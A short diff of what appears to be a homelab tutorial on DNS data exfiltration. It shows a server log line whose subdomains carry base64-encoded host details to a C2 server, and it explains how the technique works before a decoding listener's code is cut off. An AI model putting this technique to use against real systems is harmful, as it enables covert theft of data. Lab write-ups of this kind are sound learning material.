@@ -160,7 +160,6 @@ client @0x77042c1ca578 192.168.1.182#55499 (YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.ho
 
 Notice how the query contains two obfuscated strings; `YWxleAo=` and `Ni4xNC4xMC1hcmNoMS0xCg==`. What we've done here is queried `homelab.local` but included the exfiltrated and encoded data as two additional subdomains. In doing this the C2 server has managed to log the query despite the fact that the domain does not exist. This is exactly how we will harness this exfiltration technique - we just need to make a listener that can decode the logs for us.
 
-To do
 ``` python
 import re
 import time
